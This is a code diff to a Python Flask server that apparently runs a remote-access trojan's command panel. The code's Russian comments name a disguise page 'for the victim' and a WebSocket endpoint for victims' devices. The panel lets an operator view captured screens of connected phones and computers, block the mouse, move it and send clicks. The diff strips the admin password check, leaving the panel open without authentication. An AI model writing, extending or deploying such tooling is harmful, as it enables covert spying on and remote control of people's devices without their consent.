@@ -7,15 +7,13 @@ import sys
 from datetime import datetime
 from flask import Flask, request, jsonify
 from flask_sock import Sock
-from werkzeug.security import generate_password_hash, check_password_hash
 
 app = Flask(__name__)
 sock = Sock(app)
 
 # ========== Хранилище ==========
-devices = {}          # device_id -> {ws, deviceType, last_seen, online, screen, nick}
-admin_sessions = {}   # session_token -> websocket
-ADMIN_PASSWORD_HASH = generate_password_hash("DDS_MrL_2026")
+devices = {}
+admin_sessions = {}
 
 # ========== Маскировочная страница (для жертвы) ==========
 MASK_PAGE = '''
@@ -124,7 +122,7 @@ MASK_PAGE = '''
 </html>
 '''
 
-# ========== АДМИН-ПАНЕЛЬ (без Vue, работает на любом телефоне) ==========
+# ========== АДМИН-ПАНЕЛЬ (БЕЗ ПАРОЛЯ) ==========
 ADMIN_PANEL = '''
 <!DOCTYPE html>
 <html>
@@ -135,12 +133,6 @@ ADMIN_PANEL = '''
   <style>
     *{margin:0;padding:0;box-sizing:border-box}
     body{background:#0d1117;color:#c9d1d9;font-family:system-ui,-apple-system,sans-serif;padding:15px;max-width:800px;margin:auto;}
-    .login-box{background:#161b22;padding:35px;border-radius:14px;text-align:center;margin-top:60px;border:1px solid #30363d;}
-    .login-box h2{color:#58a6ff;margin-bottom:15px;}
-    .login-box input{width:100%;padding:14px;margin:10px 0;border-radius:8px;border:1px solid #30363d;background:#0d1117;color:#fff;font-size:16px;}
-    .login-box button{width:100%;padding:14px;background:#238636;border:none;border-radius:8px;color:#fff;font-size:16px;font-weight:bold;cursor:pointer;}
-    .login-box .error{color:#f85149;margin-top:8px;font-size:14px;}
-    .hidden{display:none !important;}
     .stat{display:inline-block;background:#21262d;padding:4px 14px;border-radius:20px;margin:3px 3px 0 0;font-size:13px;}
     .device-card{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:14px;margin-bottom:12px;}
     .device-card.online{border-color:#2ea043;}
@@ -166,39 +158,26 @@ ADMIN_PANEL = '''
 </head>
 <body>
 <div id="app">
-  <!-- Логин -->
-  <div id="loginBox" class="login-box">
-    <h2>🔐 DDS_MrL Console</h2>
-    <input type="password" id="passwordInput" placeholder="Пароль доступа" autocomplete="off">
-    <button id="loginBtn">Войти</button>
-    <div id="loginError" class="error hidden">Неверный пароль</div>
-    <p style="color:#8b949e;font-size:12px;margin-top:10px;">Секретный вход</p>
+  <h1>🛸 DDS_MrL — Управление</h1>
+  <div class="stats">
+    <span class="stat" id="onlineCount">🟢 0 онлайн</span>
+    <span class="stat" id="phoneCount">📱 0 телефонов</span>
+    <span class="stat" id="pcCount">💻 0 ПК</span>
+    <span class="stat" id="tabletCount">📟 0 планшетов</span>
   </div>
+  <div id="deviceList"></div>
 
-  <!-- Панель управления -->
-  <div id="panel" class="hidden">
-    <h1>🛸 DDS_MrL — Управление</h1>
-    <div class="stats">
-      <span class="stat" id="onlineCount">🟢 0 онлайн</span>
-      <span class="stat" id="phoneCount">📱 0 телефонов</span>
-      <span class="stat" id="pcCount">💻 0 ПК</span>
-      <span class="stat" id="tabletCount">📟 0 планшетов</span>
-    </div>
-    <div id="deviceList"></div>
-
-    <!-- Просмотр -->
-    <div id="viewerArea" class="viewer-area hidden">
-      <h3 id="viewerTitle">Просмотр</h3>
-      <img id="viewerScreen" src="" />
-      <div class="viewer-controls">
-        <button class="primary" onclick="captureScreen(currentViewId)">📸 Обновить</button>
-        <button class="danger" onclick="blockMouse(currentViewId, true)">🖱️ Заблок.</button>
-        <button onclick="blockMouse(currentViewId, false)">🖱️ Разблок.</button>
-        <span>X</span><input type="number" id="mx" value="300">
-        <span>Y</span><input type="number" id="my" value="200">
-        <button onclick="moveMouse(currentViewId, parseInt(document.getElementById('mx').value), parseInt(document.getElementById('my').value))">⬆️ Двиг</button>
-        <button onclick="sendClick(currentViewId, parseInt(document.getElementById('mx').value), parseInt(document.getElementById('my').value))">🔘 Клик</button>
-      </div>
+  <div id="viewerArea" class="viewer-area" style="display:none;">
+    <h3 id="viewerTitle">Просмотр</h3>
+    <img id="viewerScreen" src="" />
+    <div class="viewer-controls">
+      <button class="primary" onclick="captureScreen(currentViewId)">📸 Обновить</button>
+      <button class="danger" onclick="blockMouse(currentViewId, true)">🖱️ Заблок.</button>
+      <button onclick="blockMouse(currentViewId, false)">🖱️ Разблок.</button>
+      <span>X</span><input type="number" id="mx" value="300">
+      <span>Y</span><input type="number" id="my" value="200">
+      <button onclick="moveMouse(currentViewId, parseInt(document.getElementById('mx').value), parseInt(document.getElementById('my').value))">⬆️ Двиг</button>
+      <button onclick="sendClick(currentViewId, parseInt(document.getElementById('mx').value), parseInt(document.getElementById('my').value))">🔘 Клик</button>
     </div>
   </div>
 </div>
@@ -209,42 +188,8 @@ ADMIN_PANEL = '''
     let sessionId = crypto.randomUUID();
     let devices = {};
     let currentViewId = null;
-    let logged = false;
     let reconnectTimer = null;
 
-    const loginBox = document.getElementById('loginBox');
-    const panel = document.getElementById('panel');
-    const passwordInput = document.getElementById('passwordInput');
-    const loginError = document.getElementById('loginError');
-
-    // Логин
-    window.login = function() {
-      const pwd = passwordInput.value;
-      if(!pwd) { loginError.classList.remove('hidden'); return; }
-      loginError.classList.add('hidden');
-      fetch('/admin/login', {
-        method: 'POST',
-        headers: {'Content-Type':'application/json'},
-        body: JSON.stringify({password: pwd})
-      }).then(function(r){ return r.json(); }).then(function(data) {
-        if(data.ok) {
-          logged = true;
-          loginBox.classList.add('hidden');
-          panel.classList.remove('hidden');
-          connectWS();
-        } else {
-          loginError.classList.remove('hidden');
-        }
-      }).catch(function() {
-        loginError.classList.remove('hidden');
-        loginError.innerText = 'Ошибка соединения с сервером';
-      });
-    };
-
-    document.getElementById('loginBtn').addEventListener('click', window.login);
-    passwordInput.addEventListener('keyup', function(e) { if(e.key === 'Enter') window.login(); });
-
-    // WebSocket для админа
     function connectWS() {
       if(ws) { try { ws.close(); } catch(e){} }
       ws = new WebSocket('wss://' + location.host + '/admin/ws');
@@ -273,12 +218,11 @@ ADMIN_PANEL = '''
       };
       ws.onclose = function() {
         if(reconnectTimer) clearTimeout(reconnectTimer);
-        reconnectTimer = setTimeout(function() { if(logged) connectWS(); }, 3000);
+        reconnectTimer = setTimeout(function() { connectWS(); }, 3000);
       };
       ws.onerror = function() { ws.close(); };
     }
 
-    // Отправка команд
     window.sendCmd = function(id, cmd, payload) {
       if(ws && ws.readyState === 1) {
         let msg = {type:'cmd', target:id, cmd:cmd};
@@ -297,13 +241,12 @@ ADMIN_PANEL = '''
     window.viewDevice = function(id) {
       currentViewId = id;
       const area = document.getElementById('viewerArea');
-      area.classList.remove('hidden');
+      area.style.display = 'block';
       document.getElementById('viewerTitle').innerText = 'Просмотр: ' + id.slice(0,8) + '...';
       const scr = (devices[id] && devices[id].screen) ? devices[id].screen : '';
       document.getElementById('viewerScreen').src = scr;
     };
 
-    // Рендер устройств
     function renderDevices() {
       let html = '';
       let online = 0, phones = 0, pcs = 0, tablets = 0;
@@ -336,15 +279,13 @@ ADMIN_PANEL = '''
       document.getElementById('pcCount').innerText = '💻 '+pcs+' ПК';
       document.getElementById('tabletCount').innerText = '📟 '+tablets+' планшетов';
 
-      // Если смотрим на устройство, но его нет — скрыть просмотр
       if(currentViewId && !devices[currentViewId]) {
-        document.getElementById('viewerArea').classList.add('hidden');
+        document.getElementById('viewerArea').style.display = 'none';
         currentViewId = null;
       }
     }
 
-    // Ручной вход в консоль для отладки
-    console.log('DDS_MrL Admin загружен. Для входа введите пароль.');
+    connectWS();
   })();
 </script>
 </body>
@@ -359,13 +300,6 @@ def mask():
 @app.route('/admin')
 def admin_panel():
     return ADMIN_PANEL
-
-@app.route('/admin/login', methods=['POST'])
-def admin_login():
-    data = request.json
-    if data and check_password_hash(ADMIN_PASSWORD_HASH, data.get('password', '')):
-        return jsonify({'ok': True})
-    return jsonify({'ok': False}), 401
 
 # ========== WebSocket для устройств (жертвы) ==========
 @sock.route('/ws')
@@ -431,7 +365,6 @@ def admin_ws(ws):
                 session = data.get('session')
                 if session:
                     admin_sessions[session] = ws
-                # Отправить текущий список устройств (без ws-объектов)
                 clean_devices = {}
                 for k, v in devices.items():
                     clean_devices[k] = {key: val for key, val in v.items() if key != 'ws'}
